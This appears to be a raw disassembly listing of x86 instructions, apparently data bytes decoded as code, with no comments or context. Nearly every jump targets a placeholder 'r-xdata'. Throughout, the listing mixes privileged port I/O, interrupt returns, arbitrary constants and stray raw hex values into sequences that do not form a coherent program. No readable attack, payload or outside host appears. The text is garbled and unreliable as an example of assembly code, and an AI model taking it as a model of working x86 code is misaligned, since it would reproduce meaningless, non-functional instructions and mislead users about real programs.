jae r-xdata
sbb al 0x73
jae r-xdata
mov dh 0x3f
or ebx [ edx ]
0xa66ee3e3 0xa1c
sahf
jae r-xdata
sbb [ ebp - 0x5a954b12 ] bl
iretd
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
mov ebx 0x6a859189
sbb al 0x96
test [ edx - 0x62 ] ebp
jecxz r-xdata
or cl ah
adc al 0x1c
sbb al 0x73
jae r-xdata
jae r-xdata
jecxz r-xdata
mov ebx 0x390a8289
jecxz r-xdata
jae r-xdata
int3
push 0x68f3c7af
xor al 0xb
jbe r-xdata
adc eax 0xe3cb6dec
jecxz r-xdata
cmp eax 0x1c3d6fec
sub al [ ebp + 0x7320eb6a ]
jae r-xdata
or dl [ eax ]
jecxz r-xdata
sbb al 0x1c
shl [ ebx ] 0x1
mov esp 0x7320b8bd
jae r-xdata
fdivr [ 0x1c3d6fec ]
and bp sp
xlat
jae r-xdata
mov ecx 0x5be6a85
jae r-xdata
push 0xffffffa5
push ds
sbb al 0x1c
or esi esi
jmp ebx
mov ebx 0x1ba66a85
shl [ ebx ] 0x1
test [ edx - 0x5a ] ebp
sbb [ esi + 0x66 ] ebp
aaa
mov edi 0x89b98a89
push 0xffffffb6
jae r-xdata
xchg ecx ebp
jae r-xdata
jae r-xdata
jae r-xdata
push 0x9e6a8519
pop ecx
mov [ esi - 0x61957a44 ] edx
or al bl
sti
jecxz r-xdata
mov eax [ eax - 0x32 ]
add ah bh
mov ah 0xa
shl [ ecx ] 0x1
jae r-xdata
sbb al 0x73
cmpsb [ esi ] [ edi ]
push ebx
or bl dl
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
mov edx 0x66ec2366
add dh ah
cmp [ esi - 0x349213eb ] dh
jecxz r-xdata
jecxz r-xdata
xor [ ecx - 0x41957a6c ] ecx
cmp [ esp + ebx ] ebx
jae r-xdata
outsd
jecxz r-xdata
jae r-xdata
sbb [ ecx - 0x61957a65 ] ecx
jecxz r-xdata
mov esp 0x5f9e6a85
push 0xe3e3235b
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
mov ah 0x6a
pop ebx
jae r-xdata
jecxz r-xdata
mov esp [ edx - 0x68 ]
faddp st0
mov ah 0x6a
movsd [ edi ] [ esi ]
lahf
or eax ecx
in eax 0xe3
jae r-xdata
jecxz r-xdata
sbb al 0xb4
mov bl 0xbc
mov ebp 0x7373202a
jae r-xdata
pop ebx
jae r-xdata
mov [ ebp + eax * 4 - 0x7af84196 ] edx
push 0xffffffb6
jae r-xdata
mov edx 0x51be6a85
jae r-xdata
jae r-xdata
jecxz r-xdata
in al dx
add dh ah
out dx eax
push 0x470aeba6
shl bl 0xe3
xchg esi eax
or al [ edi - 0x40 ]
jecxz r-xdata
mov esp edi
loop r-xdata
xchg esi eax
jecxz r-xdata
jae r-xdata
sbb bl [ esp + ebx ]
add ebx esi
retn 0xb4d5
shl ebx 0xe3
jae r-xdata
cmpsb [ esi ] [ edi ]
sbb al 0x6e
jae r-xdata
or [ esp + ebx ] bl
or cl cl
adc al 0x3b
and [ ebx + 0x73 ] dh
in al dx
jae r-xdata
sbb al 0x60
scasd [ edi ]
mov bl 0x1c
je r-xdata
cmp esp [ eax ]
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
mov [ 0xffffffffe3d3e38b ] eax
mov dh 0xbd
mov bh [ ecx + 0x6a858d89 ]
jae r-xdata
and bp sp
jae r-xdata
jae r-xdata
pop es
test [ edx - 0x42 ] ebp
test [ edx - 0x52 ] ebp
push 0xffffffbe
jae r-xdata
jae r-xdata
jecxz r-xdata
mov bl 0xb
or [ si ] bl
jecxz r-xdata
jecxz r-xdata
pop ebx
and eax 0x970a8a89
aas
sbb al 0x1c
outsb
aaa
test [ edx - 0x52 ] ebp
jae r-xdata
jae r-xdata
scasb [ edi ]
push edi
outsb
cmpsb [ esi ] [ edi ]
or [ ebx + 0x6a858a89 ] edi
cmpsb [ esi ] [ edi ]
btc [ ecx - 0x59957a6b ] ecx
or eax 0xe3e0d80a
jecxz r-xdata
and al 0xa6
xrstor [ eax + 0x270aaeb5 ]
cmp al 0x1c
sbb al 0x85
push 0xffffffa6
or edi [ ebx + 0x6a859189 ]
dec ebx
cmp ebx [ esp + ebx ]
or eax 0xa1c1c06
jae r-xdata
sbb ebx [ esp + ebx ]
jecxz r-xdata

mov ah 0xaf
jae r-xdata
sar [ eax ] 0x1
mov ah 0x66
mov [ edx - 0x1c1cc6f6 ] eax
push edi
mov esp 0x559e6a85
mov [ esi - 0x61957a44 ] ebp
push 0x859b8919
push 0xffffff9e
mov ecx 0x100a8789
mov [ ebp - 0x4249957b ] ecx
jae r-xdata
in al dx
jae r-xdata
pop edi
test [ edx - 0x62 ] ebp
jae r-xdata
push ecx
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
daa
out dx eax
outsb
nop [ esp + ebx ] bx
mov bl 0xa
cmp bl [ ebx ]
sbb al 0x1c
jecxz r-xdata
daa
out dx eax
mov ch 0xb
insd
leave
jecxz r-xdata
or esp [ edi + 0x8 ]
sbb al 0x1c
pushad
lss esi [ eax - 0x4be32f4c ]
and bp sp
daa
out 0xe3 al
jecxz r-xdata
inc bx
push ds
sbb al 0x1c
mov bl 0xb0
sbb al 0xb4
scasd [ edi ]
pop ebp
scasb [ edi ]
jae r-xdata
or edi esi
jae r-xdata
jae r-xdata
sbb al 0x1c
or cl [ ebx + 0x3b ]
sbb al 0x1c
jae r-xdata
cmp eax 0xd01c1c1c
and edi [ ebp + edi * 4 + 0x737320b8 ]
cmpsd [ esi ] [ edi ]
or ah [ ebp + 0xb ]
sbb al 0x1c
outsb
sbb al 0x1c
mov ebp 0xa8789b9
adc dh al
jecxz r-xdata
test [ edx - 0x4a ] ebp
ror [ ebx ] cl
shl ebp cl
jecxz r-xdata
mov ah 0x6a
movsd [ edi ] [ esi ]
nop
jae r-xdata
sahf
jecxz r-xdata
push esp
jmp r-xdata
mov ah 0x89
loope r-xdata
push 0xb4b0b20f
rcr [ esp + esi * 4 ] 0x1
jae r-xdata
mov ecx esp
or ah [ ebx + 0x731c1c3c ]
jae r-xdata
mov edx 0x6a859789
scasb [ edi ]
jae r-xdata
jae r-xdata
or ax 0x1c06
sbb al 0xa
insd
sbb al 0x74
pavgw mm4 mm3
push edx
add bl [ esp + ebx ]
jae r-xdata
or ecx [ edi + 0xa1c1c08 ]
leave
mov bl 0xb4
sbb al 0x1c
jae r-xdata
xchg edx eax
in al dx
jecxz r-xdata
push esp
rol [ ebp - 0x2f5ea9a ] 0x1
loopne r-xdata
and esi [ ebx - 0x51911e77 ]
inc edi
jae r-xdata
idiv [ ecx ]
jae r-xdata
and [ edx + 0x6a859689 ] edi
xchg edi eax
jae r-xdata
jae r-xdata
push 0xffffffa6
pop es
or ch [ 0x6e1c1c39 ]
jae r-xdata
jecxz r-xdata
or ah cl
std
jecxz r-xdata
inc cl
jecxz r-xdata
sbb al 0x1c
jae r-xdata
shl ebx 0xe3
and cx [ edx ]
cmp ebp esp
jecxz r-xdata
sbb al 0xb5
or [ edx ] 0xffffff8f
mov al 0xa
lodsb [ esi ]
loopne r-xdata
cmp edi [ edx + 0x51be6a85 ]
jae r-xdata
mov [ 0xffffffff89b323d0 ] eax
loope r-xdata
test [ edx - 0x52 ] ebp
sub ebp [ eax + 0x2b ]
shl [ ebx ] 0x1
test [ edx - 0x42 ] ebp
push ebp
test [ edx - 0x5a ] ebp
xor eax edx
cmp [ esi - 0x5a ] ch
aaa
test [ edx - 0x6a ] ebp
sub eax 0x85eb9668
push 0xffffffbe
pop ebx
push 0x20ab339
push es
sbb al 0x1c
jae r-xdata
jae r-xdata
and bp sp
adc [ bp + di ] 0x1c
sbb al 0x6e
pushad
daa
cmpsb [ esi ] [ edi ]
inc edi
or ebp ecx
in al dx
jecxz r-xdata
test [ edx - 0x42 ] ebp
jae r-xdata
push ds
sbb al 0x1c
pop ds
mov dl 0xa
scasb [ edi ]
jecxz r-xdata
jae r-xdata
out dx eax
mov ebx esi
outsb
cmpsb [ esi ] [ edi ]
aas
mov al 0xa
loope r-xdata
test [ edx - 0x4a ] ebp
cmp ecx [ edx ]
jecxz r-xdata
jae r-xdata
mov esi 0xae6a8551
jae r-xdata
jecxz r-xdata
jae r-xdata
or dl [ edx + 0x73e3e3ec ]
jae r-xdata
push 0xffffffae
in al dx
jae r-xdata
fld [ 0x73731c1c ]
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
mov al 0x85
jae r-xdata
cmc
jecxz r-xdata
shl [ ebx ] 0x1
jecxz r-xdata
jae r-xdata
jae r-xdata
mov al [ 0xffffffffe064e768 ]
cmpsb [ esi ] [ edi ]
inc ecx
push 0xffffffae
jae r-xdata
jecxz r-xdata
in al dx
pop ebx
loop r-xdata
rol [ esi ] 0x1
sbb al 0x1c
jae r-xdata
sbb al 0x1c
jae r-xdata
jecxz r-xdata
sbb al 0x73
jae r-xdata
and esp [ ebx + 0x1c02670a ]
jae r-xdata
scasb [ edi ]
daa
push 0xbe6a853c
push ebx
push 0x6a85ba3b
mov [ edi + 0x21ae6a85 ] edx
mov edx 0x6a859689
jae r-xdata
jae r-xdata
cmp eax 0xd0e3e3f2
pop es
push 0x1b2207a6
cld
dec ebx
loop r-xdata
scasb [ edi ]
outsb
xchg di ax
sbb [ esp + ebx ] bl
or ch ah
in eax 0xe3
jecxz r-xdata
or bh [ edi ]

mov [ ebp + eax * 4 - 0x45f65196 ] eax
mov [ edx + 0xfae6a85 ] ecx
or al [ edi - 0x131c1c06 ]
rol [ 0x1c1c ] 0x1
jae r-xdata
outsb
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
and ecx [ ecx - 0x39ecf565 ]
jecxz r-xdata
jae r-xdata
or ah [ edi + 0x2 ]
jae r-xdata
test [ edx - 0x52 ] ebp
in al dx
sbb al 0x89
or cl [ edi + 0x1f ]
test [ ebx - 0x1e ] ebx
cmp eax 0xd0e3e3f2
jae r-xdata
mov [ ebx - 0x1c39ecf6 ] ebx
jecxz r-xdata
jmp r-xdata
push 0x54ec1fa6
sbb al 0xec
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
scasb [ edi ]
cmp [ edx + 0x6a85cd89 ] edi
scasb [ edi ]
aas
mov edx 0x3dae6a85
push 0xa66a852b
pushad
pop es
shl [ ebx ] 0x1
scasb [ edi ]
cmp eax 0x6a852b68
cmpsb [ esi ] [ edi ]
out 0xa0 eax
push 0xa6e064e7
cmpsb [ esi ] [ edi ]
pop ds
in al dx
push esp
push ds
jae r-xdata
jae r-xdata
add bl [ esp + ebx ]
jae r-xdata
sbb ebx [ edx + ecx ]
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
daa
out dx eax
ficomp [ edi + 0x67ecc3c7 ]
jecxz r-xdata
push 0xffffffa6
push esp
cmp al 0x35
jae r-xdata
jae r-xdata
jecxz r-xdata
adc [ 0x73731c1c ] ecx
sbb ebx [ esp + esi * 4 ]
xchg [ eax + 0x1b ] esp
sbb al 0xa
jecxz r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
jecxz r-xdata
test [ edx - 0x52 ] ebp
xor eax 0x858289ba
push 0xffffffae
cmp edi [ edx + 0x6a858489 ]
jae r-xdata
or dl [ ecx ]
or eax 0x73731c1c
jae r-xdata
jae r-xdata
lahf
outsb
jae r-xdata
out 0x8b eax
mov al 0x1c
mov ch 0xf7
mov ah 0x1c
jne r-xdata
jae r-xdata
mov esp ebx
shl ebx cl
jecxz r-xdata
xor eax 0xe7891c1c
mov al 0xb5
test edx ebx
jmp r-xdata
jecxz r-xdata
sub bl bh
or bl bl
push 0xffffffa7
mov ebx 0x67ec2366
test al 0xf7
sbb al 0x73
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
push eax
or bl [ esp + ebx ]
jecxz r-xdata
ja r-xdata
push 0x18e40a0f
sbb al 0x1c
push 0xae6a852b
or edi [ edx + 0x6a858489 ]
scasb [ edi ]
or [ edx + 0x6a858a89 ] edi
scasb [ edi ]
mov [ 0x1c02670a ] eax
jae r-xdata
jecxz r-xdata
jae r-xdata
pop es
jae r-xdata
sbb al 0x73
mov ah 0xa
cwde
jmp r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
adc ecx [ ecx + 0xa206891 ]
fdivr st2
jecxz r-xdata
mov [ esi - 0x59957a48 ] eax
push 0xa66a1ba6
jecxz r-xdata
jae r-xdata
or ch [ edx + 0x731c1c0d ]
mov al [ 0xffffffff901cb3fd ]
mov ebx 0xbb42568
mov esi 0x60e3e3fb
outsb
in al dx
jae r-xdata
jae r-xdata
push 0x87b41c1b
pushad
push 0xefa368e2
push 0xe368efa3
push 0xfba368e3
push 0xffffffe7
mov esi 0xba3b6853
jecxz r-xdata
add bl [ si ]
jae r-xdata
push 0x5e
aaa
push ds
sbb al 0x1c
and cx [ edx ]
loope r-xdata
jae r-xdata
or ebp [ eax - 0x5a ]
pop ss
push 0xffffffa6
sbb ebp [ edx - 0x5a ]
and esp [ ebx + 0x6a85202a ]
xor [ eax ] bl
adc eax 0x3c682d68
jae r-xdata
test [ eax + 0xa ] 0x77
out 0xe3 eax
jecxz r-xdata
sbb al 0x1c
sbb al 0x96
pop ds
or dl [ edx + edi * 8 - 0x1d ]
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
sahf
shl [ ebx ] 0x1
mov [ 0x6a85202a ] eax
jecxz r-xdata
mov edx 0xe3cba40b
jecxz r-xdata
sbb al 0x1c
mov edi esp
cmp al 0x35
jae r-xdata
push 0xee00a0f
sbb al 0x1c
jae r-xdata
mov al 0xb3
or esp ecx
or [ esp + ebx ] ebx
pushad
daa
out dx eax
mov al 0xa
or [ eax ] 0x6a731c1c
cmpsd [ esi ] [ edi ]
pushad
lahf
mov edi 0x6a67ece3

sbb al 0x1c
jae r-xdata
or dl [ edi + 0x731c1c18 ]
jae r-xdata
pushad
sub eax 0x18303c68
jae r-xdata
and al bl
jecxz r-xdata
mov ebx 0x85b88689
or [ ebx + 0x6a858489 ] edi
cmpsb [ esi ] [ edi ]
btc [ ecx - 0x59957a7a ] ecx
or eax 0xc1c00abb
jecxz r-xdata
xchg esi eax
jae r-xdata
jmp r-xdata
sbb al 0x1c
jae r-xdata
or dl [ ebx ]
add [ esp + ebx ] bl
jae r-xdata
jae r-xdata
sbb esp [ esi + 0x1c ]
test [ edx ] 0x1c1c1897
jae r-xdata
out 0xc7 eax
mov edx 0x73737320
jae r-xdata
daa
pushad
sbb al 0x1c
jae r-xdata
sbb esp edx
in al dx
sub bl bh
and [ ebx + 0x73 ] dh
mov ch 0x85
sti
jae r-xdata
mov ebx esi
or cl [ edi + 0x1f ]
or edx [ eax + 0xa ]
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
sbb [ esp + ebx ] bl
jae r-xdata
mov [ 0xffffffffc7e76afb ] eax
push 0x20bac7e7
push ebp
loop r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
or edi [ ebx + 0x6a858289 ]
cmpsb [ esi ] [ edi ]
scasb [ edi ]
add ecx [ edx ]
call 0x742a1e79
sbb al 0x96
jae r-xdata
jae r-xdata
test [ edx - 0x5a ] ebp
xor [ ecx + 0xa0d0a86 ] ecx
cmc
jecxz r-xdata
in al dx
in al dx
jae r-xdata
jecxz r-xdata
jae r-xdata
xchg edi eax
jae r-xdata
rcl [ 0x3c682d68 ] 0x1
jae r-xdata
push es
sbb al 0x1c
jae r-xdata
or bh bl
or bl [ eax + 0x73e3e3eb ]
jae r-xdata
cli
jecxz r-xdata
jae r-xdata
pop edx
shl ebx cl
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
sbb al 0xb4
mov bl 0xa
adc eax [ eax ]
sbb al 0x1c
jae r-xdata
sbb al 0x73
jae r-xdata
sbb al 0x1c
jecxz r-xdata
jecxz r-xdata
push 0xffffff9e
pop ds
mov esp 0x6a85a189
sahf
push ebx
mov esp 0x519e6a85
outsb
jae r-xdata
jae r-xdata
jae r-xdata
or cl [ ebx + edi + 0x1c ]
sbb al 0x73
mov ah 0xb4
mov ebx eax
or bh [ ebx ]
cmp [ esp + ebx ] ebx
jae r-xdata
jae r-xdata
sbb al 0x1c
test edx ebx
xlat
jae r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
push 0x303c682d
sbb [ eax + 0x25 ] ah
jmp r-xdata
jae r-xdata
inc ebp
cmp esp [ esi + 0x38 ]
in al dx
adc [ di ] dh
cmpsb [ esi ] [ edi ]
pop es
jae r-xdata
xchg [ eax - 0x1e ] ebp
push 0xa368efa3
out dx eax
push 0x68e368e3
sbb al 0x1c
shr [ edx ] 0x1
fisubr [ esi + 0x2e65ecef ]
and edi [ ebp + 0x737320b8 ]
jae r-xdata
jae r-xdata
jecxz r-xdata
mov dl 0xa
sbb edx [ esp + ebx ]
sbb al 0x73
jae r-xdata
sbb al 0x75
imul esp ebx 0xffffffe3
in al dx
jl r-xdata
fcmovbe st7
mov ebx 0x73e3e3f9
jae r-xdata
sbb al 0xba
mov edx 0xb23bae6e
mov [ ebx + 0x6ab3951c ] esp
in al dx
jae r-xdata
dec esp
cmp ebx [ esp + ebx ]
jae r-xdata
mov ah 0xb3
jae r-xdata
jae r-xdata
jecxz r-xdata
fsubrp st2
jecxz r-xdata
inc [ esi ]
sbb al 0x1c
jae r-xdata
shl [ ebx ] 0x1
jae r-xdata
jae r-xdata
mul ebx
jecxz r-xdata
and eax 0xbf6ba1eb
push 0x6018303c
in al dx
fistp [ esi ]
or edi edi
jae r-xdata
mov eax 0x73737320
jae r-xdata
sbb al 0x96
adc ecx [ edx ]
xchg [ edx ] cl
jae r-xdata
or al dh
pop ss
sbb eax 0xb31c1c1f
jae r-xdata
jae r-xdata
mov bh 0xea
jecxz r-xdata
sbb al 0x1c
pushad
or al 0x1c
jae r-xdata
or dh al
sbb [ esp + ebx ] bl
jae r-xdata
mov ah 0x89
retn
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or cl [ ebx + 0x60e3e3c6 ]
cmpsb [ esi ] [ edi ]
pop ds

jae r-xdata
jae r-xdata
mov ebp 0x737320b8
jae r-xdata
push 0x36450a13
cmp eax 0x1c03b70a
test al 0xab
mov dl 0x68
test al 0xbb
or ecx [ edx ]
out dx eax
jecxz r-xdata
sbb al 0x1c
[ esp + ebx ]
jae r-xdata
jae r-xdata
jae r-xdata
or eax 0x731c1c0a
jae r-xdata
or al [ esi + 0x731c1c10 ]
jae r-xdata
inc bx
sbb al 0xb4
mov bl 0xb0
sbb al 0x74
dec edi
in al dx
and [ ebx + 0x73 ] dh
jae r-xdata
in al dx
push 0x68b2b20f
scasb [ edi ]
jmp r-xdata
or dh [ edi + 0x73e3e3ea ]
jae r-xdata
push esp
jae r-xdata
jae r-xdata
mov [ esi + 0x1c0a0d0a ] eax
jae r-xdata
or ah [ ebx + 0xa ]
jae r-xdata
jae r-xdata
jae r-xdata
mov esi 0xf7460a3b
jecxz r-xdata
sbb al 0x1c
mov edx 0x3bae6eba
mov dl 0x89
jae r-xdata
sbb al 0xb3
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
jne r-xdata
jecxz r-xdata
mov [ 0x6ab3951c ] eax
jecxz r-xdata
and esp ecx
sbb al 0x60
in al dx
jae r-xdata
retn
xchg esi eax
push ds
inc ebx
jae r-xdata
mov dh 0x3f
or ebp [ ecx + 0xae3e3e1 ]
inc edi
cmp al 0x1c
sbb al 0x73
jae r-xdata
pushad
and ah cl
pushad
and ecx esp
test [ esi + 0x23 ] esp
in al dx
test eax 0xec1c1c37
push esp
loope r-xdata
and ah cl
pushad
jae r-xdata
xchg esi eax
push 0xffffffa6
sbb ebx [ esp + esi * 4 ]
mov bh 0x66
and ebp esp
or cl [ 0x731c1c0a ]
jae r-xdata
jecxz r-xdata
xchg edi eax
jae r-xdata
or bl [ esp + ebx ]
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
in al dx
or al 0x1c
jae r-xdata
jae r-xdata
push 0xffffffa6
jecxz r-xdata
xchg [ esp + esi * 4 ] ebx
jmp r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
cld
jmp 0x73ba2107
jae r-xdata
jae r-xdata
mov cl 0x34
sbb al 0x1c
loope r-xdata
jae r-xdata
or bl [ esp + ebx ]
jae r-xdata
jecxz r-xdata
sbb al 0x73
jae r-xdata
mov bl 0xb
jae r-xdata
jae r-xdata
jecxz r-xdata
push 0xffffffae
jae r-xdata
push 0x9b0a1ba6
jae r-xdata
push 0x630ab20f
lea ebp [ eax + 0x39 ]
test [ edx - 0x42 ] ebp
loope r-xdata
jae r-xdata
sbb al 0xb3
mov bl 0x1c
mov ah 0xb3
mov al 0x1c
je r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0x97
jae r-xdata
and ebp [ esi - 0x47 ]
xor esp [ eax + 0x18 ]
0x1c0b1d0a 0x731c
or eax 0xd01c1c04
sub bl dl
scasb [ edi ]
out dx eax
in al dx
lea eax [ 0x140a1c1c ]
sbb [ esp + ebx ] bl
sbb al 0x73
outsb
scasb [ edi ]
cmp esi [ edx - 0x6ae35c77 ]
mov bl 0x6a
and bl ah
jecxz r-xdata
jae r-xdata
jae r-xdata
push 0xffffffa6
mov al 0xb5
mov ah 0x68
adc ebx [ edi - 0x1e ]
jecxz r-xdata
jae r-xdata
jae r-xdata
or ah bl
xor eax 0x73731c1c
jae r-xdata
push cs
sbb ecx [ edx ]
jae r-xdata
xchg [ eax ] dl
sbb al 0x1c
jae r-xdata
test [ edx - 0x42 ] ebp
jae r-xdata
in al dx
push esp
shl [ eax + 0x22 ] cl
loope r-xdata
in ax 0xe3
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x73
mov ebx esp
mov ch 0xb
rol [ esi ] cl
sbb al 0x1c
jae r-xdata
jae r-xdata
loop r-xdata
jae r-xdata
mov bl 0xa
fadd st0
jecxz r-xdata
or bl [ edx + 0x12 ]
jecxz r-xdata
sbb al 0xb5
fild [ eax - 0x5a ]
jae r-xdata
mov ebp ebx
loope r-xdata
loop r-xdata
jae r-xdata
fwait
jae r-xdata
jae r-xdata
jae r-xdata
or bl ah
jae r-xdata
test [ edx - 0x42 ] ebp
mov [ ebp + 0x6a853968 ] ecx
mov esi 0x6a85b8e1
mov esi 0xb8d589e7
xchg esi eax
shr [ edx ] 0x1
jae r-xdata
jno r-xdata
test [ edx - 0x42 ] ebp
sbb al 0x1c
mov dh 0x68
lss ecx [ edx ]
arpl [ edx ] cx
or bh bl
jae r-xdata
jae r-xdata
jae r-xdata
mov esi 0x3b470ae5
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
mov dh 0x68
sbb eax 0x1c1ed50a
sbb al 0x73
jae r-xdata
jae r-xdata
sub ah [ eax ]
jae r-xdata
in al dx
sbb ebx eax
and al 0xa
retn 0xe3c0
into
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
sbb al 0x73
jae r-xdata
jecxz r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
shl bl 0xe3
shl [ ebx ] 0x1
and [ ebx + 0x73 ] dh
jae r-xdata
pushad
sbb ebx [ esp + ebp * 8 ]
jae r-xdata
adc bl [ esp + ebx ]
sbb al 0x1c
jae r-xdata
in eax 0xa
push 0xffffffbe
jae r-xdata
pop ds
sbb al 0x1c
jae r-xdata
jae r-xdata
pushad
jae r-xdata
sbb al 0x1c
or al [ edi + 0x3b ]
jae r-xdata
jae r-xdata
sbb al 0x1c
mov dh 0x68
lss esi [ edx - 0x4f145198 ]
or bh dh
jae r-xdata
jae r-xdata
or edx [ ecx ]
adc [ si ] ebx
sbb al 0x73
jae r-xdata
out 0x89 eax
push 0xffffffbe
jmp r-xdata
push 0x164a0b25
jae r-xdata
shl [ ebx ] 0x1
jae r-xdata
mov esp ebx
jae r-xdata
jae r-xdata
and bp sp
jae r-xdata
jae r-xdata
xor ebp [ esi + 0x66 ]
arpl [ esi ] bx
sbb al 0x1c
mov al 0xb3
cmpsb [ esi ] [ edi ]
jecxz r-xdata
and ecx [ edx ]
sub al 0xff
jae r-xdata
jae r-xdata
mov bl 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
sbb ecx [ edx ]
paddd mm4 mm3
jecxz r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jbe r-xdata
sbb al 0xec
pop ss
sbb al 0x96
pop ds
sbb al 0x96
pop es
sbb al 0xb4
dec [ ebx - 0x1c1c9c1d ]
mov al 0xa
sbb al 0x96
or ch [ ecx + edi ]
sbb al 0x1c
push 0x1ed50a1d
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
cmp ebx [ esp + ebx ]
and bp sp
jae r-xdata
or eax 0x8b731c1c
jae r-xdata
add eax 0x73731c1c
aaa
sbb al 0x1c
push 0x110beba6
jae r-xdata
sbb al 0x1c
pushad
or ecx [ edx + 0x16 ]
jae r-xdata
mov edx 0x66ec2366
pop ebp
sbb [ esp + ebx ] bl
jae r-xdata
or ch [ edi + edi * 8 ]
push 0xffffffa6
jae r-xdata
mov al 0xa
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
mov ebx 0xb3e3e3e2
jae r-xdata
jae r-xdata
in al dx
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
mov ch 0x87
scasb [ edi ]
jae r-xdata
jae r-xdata
punpckldq mmx1 [ edi ]
jae r-xdata
inc edi
jae r-xdata
jae r-xdata
jae r-xdata
shl [ ebx ] 0x1
outsb
mov ecx 0xea186033
or bl [ 0x731c1c0b ]
jae r-xdata
jae r-xdata
or ecx [ ebp + 0xa1c1c05 ]
adc al 0x18
sbb al 0x1c
jae r-xdata
pop cx
in eax dx
sbb al 0x60
jecxz r-xdata
sbb al 0x73
adc ebx eax
jae r-xdata
jecxz r-xdata
jae r-xdata
xor bh bh
jecxz r-xdata
jecxz r-xdata
jae r-xdata
shl dh 0x1
jecxz r-xdata
test [ eax - 0x25 ] esp
jecxz r-xdata
mov ch 0x68
adc ebp esp
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
and [ esp + ebx ] edi
sbb al 0x68
lodsd [ esi ]

sbb al 0x1c
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
jmp r-xdata
in al dx
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
insd
loopne r-xdata
popad
adc [ esp + ebx ] bl
mov ebx esp
sbb al 0x75
dec edi
and ebp esp
jae r-xdata
jae r-xdata
jecxz r-xdata
adc [ edx ] cl
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
mov ch 0xa
dec ebx
pop ss
sbb al 0x1c
jae r-xdata
mov al 0x36
sbb al 0x1c
or ch [ ecx ]
loope r-xdata
pop ds
pushad
sahf
pop ds
loopne r-xdata
or al 0x1c
push 0xed67ec13
mov [ ebp + 0x600a1b68 ] edx
sbb [ esp + ebx ] ebx
pushad
jae r-xdata
jecxz r-xdata
or bl bl
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
pushad
fninit
jecxz r-xdata
or ah cl
sbb al 0x1c
mov bh 0xea
bound ecx [ edi ]
xor [ esp + ebx ] bl
or cl dh
jae r-xdata
mov ch 0xdf
sbb al 0x73
aad 0xb8
jecxz r-xdata
jae r-xdata
jae r-xdata
sbb dh [ ebx ]
sbb al 0x73
jae r-xdata
and [ si ] edi
sbb al 0x1c
push 0xa668cbad
aaa
and ebp esp
or dh [ ecx + 0x3b ]
or edi [ ebx - 0x4c1c1c1e ]
0xecd21a60 0x4266
sbb al 0x68
jae r-xdata
push 0xffffffa6
pop ss
mov [ edi - 0x57f5da98 ] edi
jecxz r-xdata
and eax 0xe3f7a80a
jae r-xdata
and ch [ edx ]
and [ ebx + 0x73 ] dh
jae r-xdata
push 0xa6d81fa6
mov edx 0xa323d0ba
or al [ edi + 0x73e3e3f4 ]
jae r-xdata
jecxz r-xdata
jae r-xdata
or eax [ 0x73731c1c ]
or dh [ ebx - 0x12 ]
jae r-xdata
jecxz r-xdata
sbb al 0x1c
jae r-xdata
out dx al
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or ah [ edi + 0x11 ]
sbb al 0x1c
jae r-xdata
in eax dx
jae r-xdata
dec ebp
shl [ ebx ] 0x1
mov [ 0x73737320 ] eax
jae r-xdata
jae r-xdata
jae r-xdata
or ch [ eax + 0x73e3e3f7 ]
jae r-xdata
stosd [ edi ]
jae r-xdata
jae r-xdata
test al 0xf7
jae r-xdata
sbb ecx [ ebx ]
jae r-xdata
or cl [ edx + 0x73e3e3e1 ]
jae r-xdata
mov dl 0x60
jae r-xdata
jae r-xdata
jecxz r-xdata
out dx al
jae r-xdata
loope r-xdata
movsd [ edi ] [ esi ]
fcom [ ebx ]
in al dx
popad
push 0x54ece7ab
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb ebp esp
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
in al dx
or ebx [ 0xffffffffb31c1c1f ]
jae r-xdata
pop ds
mul ebx
jae r-xdata
push esp
in al dx
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
